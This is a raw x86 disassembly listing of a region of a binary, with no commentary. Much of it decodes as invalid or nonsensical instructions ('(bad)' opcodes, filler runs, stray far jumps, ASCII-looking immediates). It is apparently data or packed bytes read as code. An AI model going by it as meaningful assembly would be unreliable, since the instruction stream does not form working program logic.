  41a17e:	mov    al,ds:0xfc444db2
  41a183:	adc    al,0xe6
  41a185:	inc    ecx
  41a186:	pop    eax
  41a187:	and    DWORD PTR [eax-0x52],ecx
  41a18a:	dec    ecx
  41a18b:	push   eax
  41a18c:	push   eax
  41a18d:	sahf   
  41a18e:	or     DWORD PTR [ecx+0x50],ecx
  41a191:	push   eax
  41a192:	cmc    
  41a193:	xor    edx,ebx
  41a195:	push   eax
  41a196:	shl    BYTE PTR [edi+0xd7d626b],0xa
  41a19d:	xchg   DWORD PTR [ebx+edi*4],esp
  41a1a0:	ins    BYTE PTR es:[edi],dx
  41a1a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1a2:	jns    0x41a125
  41a1a4:	cli    
  41a1a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1a6:	rol    BYTE PTR cs:[eax+esi*1+0x1cf6baa5],cl
  41a1ae:	test   al,0xc0
  41a1b1:	rcr    BYTE PTR [ebx],0xe1
  41a1b4:	rol    al,0x46
  41a1b7:	and    al,0xc0
  41a1b9:	rol    al,0x45
  41a1bc:	inc    ebp
  41a1bd:	inc    ebp
  41a1be:	inc    ebp
  41a1bf:	inc    ebp
  41a1c0:	inc    ebp
  41a1c1:	inc    ebp
  41a1c2:	inc    ebp
  41a1c3:	inc    ebp
  41a1c4:	push   esi
  41a1c5:	pop    edx
  41a1c6:	outs   dx,BYTE PTR ds:[esi]
  41a1c7:	or     eax,0x653c6563
  41a1cc:	inc    ecx
  41a1cd:	je     0x41a234
  41a1cf:	gs and BYTE PTR ds:[esi],ch
  41a1d3:	jb     0x41a243
  41a1d5:	and    BYTE PTR [ebp+0x62],ah
  41a1d8:	cs cmp eax,0x2e206573
  41a1de:	cs push ebx
  41a1e0:	data16 cs cmp ch,BYTE PTR cs:[edi+0x73]
  41a1e6:	jbe    0x41a256
  41a1e8:	jo     0x41a25f
  41a1ea:	jae    0x41a1f6
  41a1ec:	ins    BYTE PTR es:[edi],dx
  41a1ed:	and    BYTE PTR gs:[esi+0x6d],ah
  41a1f1:	jae    0x41a254
  41a1f3:	and    BYTE PTR [eax],ah
  41a1f5:	and    BYTE PTR [eax],ah
  41a1f7:	jae    0x41a268
  41a1f9:	or     eax,0x74766570
  41a1fe:	cmp    al,0x78
  41a200:	outs   dx,BYTE PTR ds:[esi]
  41a201:	ja     0x41a275
  41a203:	mov    edi,0x45f8c44b
  41a208:	push   ebp
  41a209:	push   ebx
  41a20a:	repz sar DWORD PTR [edi-0x52],1
  41a20e:	in     eax,dx
  41a20f:	push   edx
  41a210:	push   ebp
  41a211:	imul   ebp,DWORD PTR [ebx+0x29],0x8bb50190
  41a218:	mov    ecx,DWORD PTR [ebx-0x74747475]
  41a21e:	mov    ecx,DWORD PTR [ebx+0x493de8e8]
  41a224:	mov    ebp,0xa1e8e838
  41a229:	and    al,0x42
  41a22b:	push   eax
  41a22c:	(bad)  
  41a22d:	bound  esi,QWORD PTR [esi]
  41a22f:	fbld   TBYTE PTR [ebx+edx*1+0x5c]
  41a233:	sbb    bh,BYTE PTR [ebp+0x696c7254]
  41a239:	aad    0xf9
  41a23b:	iret   
  41a23c:	in     eax,dx
  41a23d:	test   al,0x9e
  41a23f:	push   ebp
  41a240:	xchg   edi,eax
  41a241:	call   0x5e858ff
  41a246:	sar    DWORD PTR [ebp-0x13],cl
  41a249:	addr16 out 0xe8,al
  41a24c:	call   0xe92aa14d
  41a251:	and    al,0x53
  41a253:	inc    ebx
  41a254:	call   0x8ece90e4
  41a259:	pop    ss
  41a25a:	shl    DWORD PTR ds:0xe58452e5,0x43
  41a261:	(bad)  
  41a262:	mov    bh,0xdf
  41a264:	xor    BYTE PTR [ebx+0x65],al
  41a267:	push   esp
  41a268:	mov    ch,0xce
  41a26a:	cli    
  41a26b:	or     BYTE PTR ds:0x8b8b8bfa,ah
  41a271:	jns    0x41a29a
  41a273:	pop    edx
  41a274:	jns    0x41a2db
  41a276:	inc    esp
  41a277:	mov    bl,0xc4
  41a279:	rcr    BYTE PTR [edx+0x11],1
  41a27c:	std    
  41a27d:	fwait
  41a27e:	adc    al,0x27
  41a280:	ret    
  41a281:	jne    0x41a260
  41a283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a284:	test   BYTE PTR [bx+0x8],dh
  41a288:	sub    BYTE PTR [ecx+0x7d8d47c9],cl
  41a28e:	mov    ecx,DWORD PTR [ebx-0x7481da83]
  41a294:	mov    ecx,DWORD PTR [ebx-0x7c7c7c7d]
  41a29a:	add    DWORD PTR [ebx+0x3a838383],0x71
  41a2a1:	(bad)  
	...
  41a2aa:	add    BYTE PTR [esp+eax*1],al
  41a2ad:	aad    0x36
  41a2af:	xor    al,0xa1
  41a2b1:	cwde   
  41a2b2:	inc    eax
  41a2b3:	sbb    esi,eax
  41a2b5:	mov    edx,0x74eada03
  41a2ba:	pushf  
  41a2bb:	cwde   
  41a2bc:	repz scas al,BYTE PTR es:[edi]
  41a2be:	dec    ebx
  41a2bf:	out    0x5b,al
  41a2c1:	es (bad) 
  41a2c3:	hlt    
  41a2c4:	and    eax,DWORD PTR [esp+eax*1]
  41a2c7:	adc    ah,BYTE PTR [esp+eax*1]
  41a2ca:	add    al,0x4d
  41a2cc:	jmp    0x33b4a6d5
  41a2d1:	pop    ds
  41a2d2:	(bad)  
  41a2d3:	test   BYTE PTR [ecx+ecx*2],0x2c
  41a2d7:	repz scas eax,DWORD PTR es:[edi]
  41a2d9:	add    eax,0xfd4be2da
  41a2de:	xor    eax,0xbd52e2a4
  41a2e3:	lods   eax,DWORD PTR ds:[esi]
  41a2e4:	lock pop ss
  41a2e6:	jnp    0x41a2ec
  41a2e8:	add    BYTE PTR [edx+0xc],ah
  41a2eb:	cld    
  41a2ec:	repnz add BYTE PTR [eax],al
  41a2ef:	add    BYTE PTR [ecx],bl
  41a2f1:	inc    ebx
  41a2f2:	mov    ebp,0x4f0c5528
  41a2f7:	jle    0x41a2b8
  41a2f9:	adc    al,0x9b
  41a2fb:	jl     0x41a284
  41a2fd:	pop    ebp
  41a2fe:	and    ah,BYTE PTR [ebx+0x49]
  41a301:	and    ch,al
  41a303:	xchg   eax,eax
  41a305:	repnz lds edx,FWORD PTR [esi+0x26]
  41a309:	(bad)  
  41a30a:	cwde   
  41a30b:	or     al,0xd7
  41a30d:	pop    fs
  41a30f:	rol    BYTE PTR [ebp+0xcb32],0x6b
  41a316:	and    eax,DWORD PTR [eax]
  41a318:	add    BYTE PTR [eax],al
  41a31a:	mov    ecx,DWORD PTR [ebx-0x74747475]
  41a320:	mov    ecx,DWORD PTR [ebx-0x12e58a75]
  41a326:	add    al,0x4
  41a328:	add    al,0x4
  41a32a:	add    al,0x4
  41a32c:	add    al,0x4
  41a32e:	add    al,0xff
  41a330:	inc    DWORD PTR [esi]
  41a332:	mov    cl,0xd7
  41a334:	inc    esi
  41a335:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a336:	jbe    0x41a329
  41a338:	xchg   ecx,eax
  41a339:	popa   
  41a33a:	add    cl,bl
  41a33c:	mov    cl,0x78
  41a33e:	js     0x41a387
  41a340:	(bad)  
  41a341:	in     al,dx
  41a342:	push   0xfffffffc
  41a344:	xchg   ebp,eax
  41a345:	pushf  
  41a346:	shl    DWORD PTR [edi],cl
  41a348:	pop    edi
  41a349:	(bad)  
  41a34a:	dec    DWORD PTR [ecx]
  41a34c:	pop    edx
  41a34d:	push   ds
  41a34e:	jge    0x41a34c
  41a350:	dec    ebp
  41a351:	xchg   BYTE PTR [edi-0x3777531c],bh
  41a357:	iret   
  41a358:	pop    esp
  41a359:	jns    0x41a30d
  41a35b:	test   dh,al
  41a35d:	jmp    0x41a383
  41a35f:	out    dx,al
  41a360:	add    ebp,DWORD PTR [esi-0x66]
  41a363:	mov    al,ds:0x95d15a2
  41a368:	(bad)  
  41a369:	inc    edi
  41a36b:	cmp    eax,0xb6ffff82
  41a370:	push   ecx
  41a371:	dec    edi
  41a372:	jmp    FWORD PTR [edx-0x6b]
  41a375:	ret    0x5a4c
  41a378:	mov    dl,0xda
  41a37a:	adc    eax,0xd9fc07ac
  41a37f:	sbb    eax,DWORD PTR [edi+0x28]
  41a382:	cmp    bl,BYTE PTR [edx]
  41a384:	inc    ebx
  41a385:	xchg   esi,eax
  41a386:	and    DWORD PTR [esp+ebx*2+0x6a1d1bae],ebx
  41a38d:	push   0x6a
  41a38f:	xor    eax,0x7a6a6aa1
  41a394:	jecxz  0x41a400
  41a396:	push   0x6a
	...
  41a3a0:	add    BYTE PTR [ebx+0x16876b84],cl
  41a3a6:	mov    esi,0x164907bd
  41a3ab:	into   
  41a3ac:	fcom   QWORD PTR [edx]
  41a3ae:	test   eax,0x84fb96b0
  41a3b3:	push   eax
  41a3b4:	push   edi
  41a3b5:	jne    0x41a404
  41a3b7:	js     0x41a428
  41a3b9:	jns    0x41a41f
  41a3bb:	ds and BYTE PTR cs:[eax+esi*2+0x73],dh
  41a3c1:	jb     0x41a3fd
  41a3c3:	popa   
  41a3c4:	sub    DWORD PTR [eax+0x65],esi
  41a3c7:	arpl   WORD PTR gs:[ebp+0x4d],sp
  41a3cb:	push   0x7572744d
  41a3d0:	jo     0x41a41f
  41a3d2:	bound  ebp,QWORD PTR [ecx+0x63]
  41a3d5:	je     0x41a414
  41a3d7:	and    BYTE PTR [edx+0x22],dh
  41a3da:	imul   esi,DWORD PTR [edx+0x20],0x74437369
  41a3e1:	inc    esp
  41a3e2:	and    BYTE PTR [esi+0x2f],dh
  41a3e5:	or     eax,0x67657465
  41a3ea:	jo     0x41a44f
  41a3ec:	bound  esp,QWORD PTR gs:[ebp+0xd]
  41a3f0:	jo     0x41a45b
  41a3f2:	jb     0x41a46a
  41a3f4:	jb     0x41a45a
  41a3f6:	ins    DWORD PTR es:[edi],dx
  41a3f7:	jb     0x41a45e
  41a3f9:	and    BYTE PTR [eax],ah
  41a3fb:	and    BYTE PTR [ebx+0x53],dh
  41a3fe:	and    BYTE PTR [esi],ch
  41a400:	and    BYTE PTR [ebx+0x3e],dh
  41a403:	je     0x41a46e
  41a405:	jae    0x41a468
  41a407:	cs jb  0x41a47e
  41a40a:	and    ch,BYTE PTR [ecx+0x70]
  41a40d:	cs jne 0x41a473
  41a410:	and    BYTE PTR [ebp+0x72],ch
  41a413:	outs   dx,BYTE PTR ds:[esi]
  41a414:	bound  esp,QWORD PTR [esi+0x76]
  41a417:	jb     0x41a45a
  41a419:	cmp    ch,BYTE PTR [esi]
  41a41b:	ins    DWORD PTR es:[edi],dx
  41a41c:	jo     0x41a48b
  41a41e:	ins    DWORD PTR es:[edi],dx
  41a41f:	jb     0x41a48e
  41a421:	jb     0x41a451
  41a423:	ins    DWORD PTR es:[edi],dx
  41a424:	sub    DWORD PTR [edx+0x3c],esi
  41a427:	outs   dx,BYTE PTR ds:[esi]
  41a428:	outs   dx,BYTE PTR ds:[esi]
  41a429:	gs jo  0x41a491
  41a42c:	gs jo  0x41a44f
  41a42f:	cmp    eax,0x732306b7
  41a434:	in     al,dx
  41a435:	outs   dx,BYTE PTR ds:[esi]
  41a436:	call   0xe92a8d23
  41a43b:	call   0x92a8d28
  41a440:	or     ah,al
  41a442:	fwait
  41a443:	pop    ecx
  41a444:	or     eax,0x5b7e0808
  41a449:	sbb    DWORD PTR [edi+0x60b35046],edi
  41a44f:	ss push es
  41a451:	das    
  41a452:	aaa    
  41a453:	dec    ebp
  41a454:	icebp  
  41a455:	popf   
  41a456:	das    
  41a457:	bound  edi,QWORD PTR ds:0x6712334f
  41a45d:	cmp    esp,DWORD PTR [esi-0x38034200]
  41a463:	(bad)  
  41a464:	loopne 0x41a410
  41a466:	gs fcom st(2)
  41a469:	xchg   ecx,eax
  41a46a:	or     BYTE PTR [eax],cl
  41a46c:	in     eax,dx
  41a46d:	push   ds
  41a46e:	or     BYTE PTR [eax],cl
  41a470:	fld    DWORD PTR [ebx-0x77af7b4]
  41a476:	push   ebp
  41a477:	test   edx,esp
  41a479:	dec    eax
  41a47a:	je     0x41a409
  41a47c:	shl    BYTE PTR [edx+0x485f01d3],1
  41a482:	(bad)
  41a486:	les    ebp,FWORD PTR [ecx+0x32316a8]
  41a48c:	mov    eax,0x47858585
  41a491:	pop    ds
  41a492:	mov    ebp,0x7124c8eb
  41a497:	outs   dx,DWORD PTR gs:[esi]
  41a499:	mov    ah,0x7f
  41a49b:	xchg   edi,eax
  41a49c:	pop    eax
  41a49d:	jmp    0x41a4f1
  41a49f:	dec    esi
  41a4a0:	mul    DWORD PTR [edi+0x7a334771]
  41a4a6:	mov    dh,0x1c
  41a4a8:	int    0x39
  41a4aa:	daa    
  41a4ab:	xlat   BYTE PTR ds:[ebx]
  41a4ac:	arpl   WORD PTR [ebp-0x677287b],ax
  41a4b2:	test   DWORD PTR [ebp+0x4040485],eax
  41a4b8:	add    al,0x4
  41a4ba:	add    al,0x4
  41a4bc:	add    al,0x4
  41a4be:	(bad)  
  41a4bf:	sbb    eax,0xffffff19
  41a4c4:	(bad)  
  41a4c5:	(bad)  
  41a4c6:	(bad)  
  41a4c7:	(bad)  
  41a4c8:	(bad)  
  41a4c9:	inc    DWORD PTR [eax]
  41a4cb:	add    BYTE PTR [ebx+0x19],ah
  41a4ce:	fist   DWORD PTR [ebx+0x7a]
  41a4d1:	sub    BYTE PTR [esp+edx*8],bh
  41a4d4:	xlat   BYTE PTR ds:[ebx]
  41a4d5:	daa    
  41a4d6:	push   0xd2d65767
  41a4db:	dec    ecx
  41a4dc:	shr    BYTE PTR [eax+0x50],1
  41a4df:	test   BYTE PTR [ebx+0x31],0x76
  41a4e3:	mov    al,ds:0xf8fd0000
  41a4e8:	add    BYTE PTR [eax],al
  41a4ea:	dec    esp
  41a4eb:	mov    ds:0x686d0000,al
  41a4f0:	test   eax,0x24c7d601
  41a4f5:	pushf  
  41a4f6:	jle    0x41a4a2
  41a4f8:	mov    BYTE PTR [esi+0x4f5dd04b],0x95
  41a4ff:	cwde   
  41a500:	inc    esi
  41a501:	cmp    eax,0x6d486627
  41a506:	add    bh,bh
  41a508:	outs   dx,DWORD PTR ds:[esi]
  41a509:	fs mov ecx,es
  41a50c:	(bad)  
  41a50d:	(bad)  
  41a50e:	(bad)  
  41a50f:	fldenv [eax]
  41a511:	or     DWORD PTR [ecx-0x6c0454e7],ecx
  41a517:	stos   BYTE PTR es:[edi],al
  41a518:	jg     0x41a53a
  41a51a:	xchg   edx,eax
  41a51b:	call   0x7a95:0x4e278750
  41a522:	std    
  41a523:	jmp    0xf3a3:0xcf862077
  41a52a:	jmp    0x1a4d:0x6de268aa
  41a531:	retf   0xffff
  41a534:	xor    ebx,DWORD PTR [edx]
  41a536:	(bad)  
  41a537:	(bad)  
  41a538:	inc    DWORD PTR [eax]
	...
  41a542:	ins    DWORD PTR es:[edi],dx
  41a543:	js     0x41a4ea
	...
  41a54d:	add    BYTE PTR [ebp+0x4b76bc85],al
  41a553:	push   cs
  41a554:	aam    0xe9
  41a556:	xchg   esi,eax
  41a557:	ins    BYTE PTR es:[edi],dx
  41a558:	sub    eax,0x5f8bf85c
  41a55d:	mov    bl,0x65
  41a55f:	fst    DWORD PTR [edx]
  41a561:	jl     0x41a5d4
  41a563:	nop
  41a564:	int    0xd3
  41a566:	or     eax,DWORD PTR [ebp+eax*4-0x786e527b]
  41a56d:	mov    esi,0x72647e97
  41a572:	and    BYTE PTR [esi-0x710948e5],bh
  41a578:	pop    edi
  41a579:	or     BYTE PTR [edx-0x78],bh
  41a57c:	call   DWORD PTR [ebp+0x30]
  41a57f:	adc    BYTE PTR [edi],0x8b
  41a582:	dec    eax
  41a583:	(bad)  
  41a584:	inc    edx
  41a585:	jle    0x41a5c5
  41a587:	test   DWORD PTR [ebp-0x7a1c8245],eax
  41a58d:	test   eax,esi
  41a58f:	aad    0xd0
  41a591:	test   DWORD PTR [eax],eax
  41a593:	jecxz  0x41a5ab
  41a595:	inc    esi
  41a596:	mov    eax,0x942cc6b1
  41a59b:	sbb    DWORD PTR [ebx+0x12fae056],ebp
  41a5a1:	mov    bh,0x64
  41a5a3:	push   esp
  41a5a4:	shr    DWORD PTR [edi-0x3aa1c092],0x18
  41a5ab:	add    BYTE PTR [eax],al
  41a5ad:	add    BYTE PTR [eax+0x50000aa],bl
  41a5b3:	push   ds
  41a5b4:	add    BYTE PTR [eax],al
  41a5b6:	add    BYTE PTR [ebx-0x74747475],cl
  41a5bc:	mov    ecx,DWORD PTR [ebx-0xfa97475]
  41a5c2:	lahf   
  41a5c3:	pop    esi
  41a5c4:	sub    esi,DWORD PTR [edi+0x5f17365b]
  41a5ca:	lahf   
  41a5cb:	in     eax,dx
  41a5cc:	mov    al,0xf6
  41a5ce:	push   esi
  41a5cf:	xor    edi,ebp
  41a5d1:	(bad)  
  41a5d2:	fs dec ebx
  41a5d4:	popf   
  41a5d5:	shl    BYTE PTR [esi],0xe1
	...
  41a5e0:	add    BYTE PTR [eax],al
  41a5e2:	add    BYTE PTR [edi],bl
  41a5e4:	mov    al,0xa1
  41a5e6:	jno    0x41a5e8
  41a5e8:	add    BYTE PTR [ebp+ebx*1-0x4494ab93],dh
  41a5ef:	jae    0x41a599
  41a5f1:	push   edi
  41a5f2:	loope  0x41a591
  41a5f4:	sbb    BYTE PTR [esi],0xfb
  41a5f7:	retf   
  41a5f8:	imul   ebx,DWORD PTR [edi+0x7f],0xa3f1a045
  41a5ff:	ds loope 0x41a62d
  41a602:	sub    eax,0x7a7bf874
  41a607:	mov    dl,0x21
  41a609:	adc    BYTE PTR [ebp+esi*4+0x7b400000],dl
  41a610:	add    BYTE PTR [eax],al
  41a612:	push   edx
  41a613:	and    eax,0x5b4500ff
  41a618:	pop    ss
  41a619:	bound  eax,QWORD PTR es:[edi+ebp*2-0x51f87c91]
  41a621:	jp     0x41a6a0
  41a623:	lahf   
  41a624:	xchg   ecx,eax
  41a625:	sub    esp,DWORD PTR [ebx+0x1d]
  41a628:	or     eax,0xf95b0eb5
  41a62d:	mov    ah,0x89
  41a62f:	inc    ebp
  41a630:	inc    ebp
  41a631:	inc    ebp
  41a632:	mov    eax,0xa69a0142
  41a637:	and    BYTE PTR [edi],dl
  41a639:	and    al,0xd9
  41a63b:	and    dh,bh
  41a63d:	or     BYTE PTR [esi-0x24100ebe],bl
  41a643:	fldcw  WORD PTR [eax-0x67]
  41a646:	dec    ebx
  41a647:	mov    ch,0xd7
  41a649:	repz push edi
  41a64b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a64c:	pushf  
  41a64d:	adc    al,0xbd
  41a64f:	inc    ebp
  41a650:	inc    ebp
  41a651:	jb     0x41a5de
  41a653:	jae    0x41a69a
  41a655:	inc    ebp
  41a656:	inc    ebp
  41a657:	int3   
  41a658:	int3   
  41a659:	int3   
  41a65a:	int3   
  41a65b:	int3   
  41a65c:	int3   
  41a65d:	int3   
  41a65e:	int3   
  41a65f:	int3   
  41a660:	ret    0xbd37
	...
  41a66b:	add    BYTE PTR [eax],al
  41a66d:	add    BYTE PTR [eax-0x4d8d8525],bl
  41a673:	sete   bl
  41a676:	imul   ebp,esi,0x26
  41a679:	fadd   QWORD PTR [ebx+0x44]
  41a67c:	pop    ss
  41a67d:	out    0xe9,al
  41a67f:	lock pop es
  41a681:	cwde   
  41a682:	adc    eax,0x2624c5
  41a687:	add    BYTE PTR [ecx+eiz*8+0x0],al
  41a68b:	add    ah,cl
  41a68d:	mov    ecx,0xb56b0000
  41a692:	lods   eax,DWORD PTR ds:[esi]
  41a693:	sub    al,0xd4
  41a695:	addr16 dec esi
  41a697:	or     BYTE PTR [edi+edx*1-0x78],ah
  41a69b:	mov    ebp,0x70f37df4
  41a6a0:	push   es
  41a6a1:	aad    0x6a
  41a6a3:	gs and BYTE PTR fs:[edi],bh
  41a6a7:	mov    dh,0x0
  41a6a9:	add    BYTE PTR [ecx+0x61],cl
  41a6ac:	(bad)  
  41a6ad:	pusha  
  41a6ae:	add    BYTE PTR [eax],al
  41a6b0:	add    BYTE PTR [eax+0x3ddad96f],al
  41a6b6:	loope  0x41a6db
  41a6b8:	cmp    bl,bh
  41a6ba:	mov    WORD PTR [ebp-0x2e60284c],ds
  41a6c0:	pop    edx
  41a6c1:	scas   eax,DWORD PTR es:[edi]
  41a6c2:	cmp    ah,BYTE PTR [ebp-0x6c]
  41a6c5:	cmp    eax,0xa76c78a2
  41a6ca:	xor    eax,eax
  41a6cc:	push   0xffffff83
  41a6ce:	in     eax,0x7e
  41a6d0:	fdivr  DWORD PTR [ebx]
  41a6d2:	idiv   BYTE PTR [esi]
  41a6d4:	add    BYTE PTR [eax],al
  41a6d6:	inc    ecx
  41a6d7:	inc    BYTE PTR [eax]
  41a6d9:	add    BYTE PTR [eax],al
  41a6db:	mov    DWORD PTR [ecx-0x76767677],ecx
  41a6e1:	mov    DWORD PTR [ecx+0x31a2aa89],ecx
  41a6e7:	int3   
  41a6e8:	int3   
  41a6e9:	int3   
  41a6ea:	int3   
  41a6eb:	int3   
  41a6ec:	int3   
  41a6ed:	int3   
  41a6ee:	int3   
  41a6ef:	int3   
  41a6f0:	add    BYTE PTR [eax],al
  41a6f2:	je     0x41a722
  41a6f4:	mov    ebx,ss
  41a6f6:	out    dx,eax
  41a6f7:	ds cmp al,0xad
  41a6fa:	sub    eax,0x11650ceb
  41a6ff:	rcl    BYTE PTR [eax+0x69a5e08e],1
  41a705:	fsubr  DWORD PTR [ecx+0x54ed00]
  41a70b:	add    BYTE PTR [esi+edx*4+0x12fd2ebb],bh
  41a712:	jp     0x41a735
  41a714:	sbb    al,0xc2
  41a716:	(bad)  
  41a717:	fcomp  DWORD PTR [ecx-0x36]
  41a71a:	add    BYTE PTR cs:[esi],ah
  41a71d:	cmp    eax,ecx
  41a71f:	jbe    0x41a72b
  41a721:	arpl   WORD PTR [ebx+eiz*1],di
  41a724:	xchg   edx,eax
  41a725:	dec    ebp
  41a726:	sbb    DWORD PTR [ecx+0x41000084],edx
  41a72c:	js     0x41a76d
  41a72e:	add    BYTE PTR [eax],al
  41a730:	ins    BYTE PTR es:[edi],dx
  41a731:	leave  
  41a732:	or     eax,0xa1100f00
  41a737:	ret    
  41a738:	sar    DWORD PTR [esi-0x6b],1
  41a73b:	adc    ecx,DWORD PTR [eax+edx*4-0x5e]
  41a73f:	sub    eax,0x2d58f482
  41a744:	pop    esi
  41a745:	lods   eax,DWORD PTR ds:[esi]
  41a746:	ss dec edx
  41a748:	mov    bl,BYTE PTR [edi+esi*1-0xb]
  41a74c:	pop    ebx
  41a74d:	(bad)  
  41a74e:	(bad)  
  41a74f:	setl   dl
  41a752:	(bad)  
  41a753:	(bad)  
  41a756:	(bad)  
  41a757:	(bad)  
  41a758:	jne    0x85c72ce3
  41a75e:	test   DWORD PTR [ebp-0x2fb77a7b],eax
  41a764:	fmulp  st(4),st
  41a766:	jno    0x41a71c
  41a768:	outs   dx,DWORD PTR ds:[esi]
  41a769:	ss xchg dh,ah
  41a76c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a76d:	pusha  
  41a76e:	cs lahf 
  41a770:	cdq    
  41a771:	pop    edi
  41a772:	(bad)  
  41a773:	push   esi
  41a774:	sbb    BYTE PTR [edi+0x2eb5ad3f],dh
  41a77a:	add    al,0x4
  41a77c:	add    al,0x4
  41a77e:	add    al,0x4
  41a780:	add    al,0x4
  41a782:	add    al,0x8b
  41a784:	mov    ebx,DWORD PTR [esi+eiz*4-0x74]
  41a788:	xor    DWORD PTR [ebx-0x796b6975],ecx
  41a78e:	fwait
  41a78f:	xor    cl,BYTE PTR [edx+0xa]
  41a792:	imul   ah
  41a794:	cmp    al,0x92
  41a796:	mov    ds,WORD PTR [edx+0x4c5ad59c]
  41a79c:	cmp    BYTE PTR [edi-0x50],al
  41a79f:	cmp    BYTE PTR [ebx+0x5aacbd98],0xac
  41a7a6:	ss std 
  41a7a8:	push   ecx
  41a7a9:	cli    
  41a7aa:	fs push ebp
  41a7ac:	mov    ds:0xe88b8be0,al
  41a7b1:	inc    ebp
  41a7b2:	mov    ecx,DWORD PTR [ebx-0x7441ef41]
  41a7b8:	add    BYTE PTR [edi-0x38],dl
  41a7bb:	and    ch,dl
  41a7bd:	aaa    
  41a7be:	jo     0x41a805
  41a7c0:	lods   eax,DWORD PTR ds:[esi]
  41a7c1:	aam    0xed
  41a7c3:	test   BYTE PTR [ecx+0x7c],bh
  41a7c6:	xchg   WORD PTR [edi+0x4e0dea8d],sp
  41a7cd:	jmp    0x63b50fcd
  41a7d2:	ins    DWORD PTR es:[edi],dx
  41a7d3:	pop    ebp
  41a7d4:	or     ah,BYTE PTR [ebp+0x72]
  41a7d7:	ins    DWORD PTR es:[edi],dx
  41a7d8:	je     0x41a83d
  41a7da:	or     eax,0x20776d65
  41a7df:	outs   dx,DWORD PTR ds:[esi]
  41a7e0:	cs popa 
  41a7e2:	inc    esp
  41a7e3:	cs popa 
  41a7e5:	cs popa 
  41a7e7:	outs   dx,DWORD PTR ds:[esi]
  41a7e8:	outs   dx,BYTE PTR ds:[esi]
  41a7e9:	or     dh,BYTE PTR [edx+0x6d]
  41a7ec:	bound  ebp,QWORD PTR [esi]
  41a7ee:	cs gs or eax,0x6f6c502e
  41a7f5:	inc    ecx
  41a7f6:	and    BYTE PTR ds:[edi+ebp*2+0x6d],dh
  41a7fb:	arpl   WORD PTR [edx+0x61],dx
  41a7fe:	gs jns 0x41a873
  41a801:	imul   si,WORD PTR gs:[eax+0x79],0x6522
  41a808:	and    esi,DWORD PTR [ebx+0x65]
  41a80b:	gs ins BYTE PTR es:[edi],dx
  41a80d:	push   ebx
  41a80e:	addr16 jb 0x41a84b
  41a811:	jne    0x41a833
  41a813:	ins    DWORD PTR es:[edi],dx
  41a814:	push   ebx
  41a815:	or     ch,BYTE PTR [ebp+0x20]
  41a818:	gs push ebx
  41a81a:	jae    0x41a87d
  41a81c:	imul   esp,DWORD PTR [ebp+0x65],0x65202e6c
  41a823:	jae    0x41a84d
  41a825:	ins    DWORD PTR es:[edi],dx
  41a826:	jae    0x41a88f
  41a828:	bound  edi,QWORD PTR gs:[ecx+0x73]
  41a82c:	outs   dx,BYTE PTR ds:[esi]
  41a82d:	and    BYTE PTR [eax+0x63],dl
  41a830:	jo     0x41a876
  41a832:	or     ch,BYTE PTR [esi+0x2e]
  41a835:	inc    esp
  41a836:	imul   esi,DWORD PTR gs:[ebp+0x73],0x653d6d69
  41a83e:	and    BYTE PTR [edi+0x44],ch
  41a841:	imul   ebp,DWORD PTR [edi+0x6d],0x6163796f
  41a848:	imul   esi,DWORD PTR [eax+eiz*1+0x65],0x6d0d7020
  41a850:	jae    0x41a828
  41a852:	add    BYTE PTR [eax],al
  41a854:	add    cl,cl
  41a856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a857:	add    al,0xe4
  41a859:	(bad)  
  41a85a:	(bad)  
  41a85b:	xlat   BYTE PTR ds:[ebx]
  41a85c:	dec    esp
  41a85d:	sub    eax,0x733ee941
  41a862:	sbb    BYTE PTR [esi+0xb],cl
  41a865:	dec    ecx
  41a866:	ja     0x41a86d
  41a868:	test   al,0x61
  41a86a:	popa   
  41a86b:	xor    al,0x8d
  41a86d:	gs sahf 
  41a86f:	pop    eax
  41a870:	mov    ebp,0x210000b8
  41a875:	icebp  
  41a876:	int3   
  41a877:	add    BYTE PTR [eax],al
  41a879:	add    BYTE PTR [ecx-0x76767677],cl
  41a87f:	mov    DWORD PTR [ecx-0x11547677],ecx
  41a885:	push   es
  41a886:	push   0x6a
  41a888:	push   0x6a
  41a88a:	push   0x6a
  41a88c:	push   0x6a
  41a88e:	push   0xffffffff
  41a890:	call   FWORD PTR [ecx-0x1c]
  41a893:	pop    esi
  41a894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a895:	loope  0x41a832
  41a897:	or     dh,BYTE PTR [ebx]
  41a899:	out    0x97,eax
  41a89b:	cmp    ecx,DWORD PTR ds:[eax+ecx*4+0x19]
  41a8a0:	sbb    bh,al
  41a8a2:	in     eax,dx
  41a8a3:	sahf   
  41a8a4:	xchg   BYTE PTR [eax-0x3],ch
  41a8a7:	pop    esp
  41a8a8:	addr16 (bad) 
  41a8aa:	dec    DWORD PTR [esi]
  41a8ac:	into   
  41a8ad:	(bad)  
  41a8ae:	inc    ebp
  41a8b0:	(bad)  
  41a8b1:	(bad)  
  41a8b2:	inc    DWORD PTR [edx-0x791e3a45]
  41a8b8:	repnz stos BYTE PTR es:[edi],al
  41a8ba:	lods   eax,DWORD PTR ds:[esi]
  41a8bb:	mov    ds:0x41f0042b,eax
  41a8c0:	xchg   DWORD PTR [eax-0x26],ebx
  41a8c3:	xor    al,0x7d
  41a8c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8c6:	ret    0x19ce
  41a8c9:	aad    0xc2
  41a8cb:	(bad)  
  41a8cc:	(bad)  
  41a8cd:	fdiv   QWORD PTR [esi-0x3c]
  41a8d0:	aas    
  41a8d1:	(bad)  
  41a8d2:	(bad)  
  41a8d3:	dec    DWORD PTR [eax+eiz*8]
  41a8d6:	cmp    eax,0x57658817
  41a8db:	sti    
  41a8dc:	pop    ebp
  41a8dd:	push   ebx
  41a8de:	movq   mm2,QWORD PTR [esi+0xb000f7a]
  41a8e5:	mul    ecx
  41a8e7:	jmp    0x1019:0xb1c49a75
  41a8ee:	std    
  41a8ef:	sbb    BYTE PTR [edx+edx*8],cl
  41a8f2:	js     0x41a92b
  41a8f4:	int    0x8
  41a8f6:	inc    ecx
  41a8f7:	(bad)  
  41a8f8:	jmp    DWORD PTR [edi-0x82]
  41a8fe:	(bad)  
